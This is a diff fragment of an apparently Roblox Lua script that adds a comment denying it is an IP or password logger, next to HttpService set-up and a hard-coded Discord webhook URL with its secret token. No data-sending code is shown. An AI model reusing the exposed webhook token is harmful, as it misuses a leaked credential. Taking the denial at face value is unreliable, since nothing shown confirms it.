@@ -55,6 +55,7 @@ end
 
 
 -- Webhook shit dont kill me, ty
+-- NOT A IP LOGGER NOR IS IT A PASSWORD LOGGER
 HttpService = game:GetService("HttpService")
 Webhook_URL = "https://discord.com/api/webhooks/1061700824914468904/Fnh75Y0sYEM0B8UWJq6X6hL0bJPIc6ybNtoz09f1jtP8U2BpzPNstbJv8LlIWDLgIv5X"
 
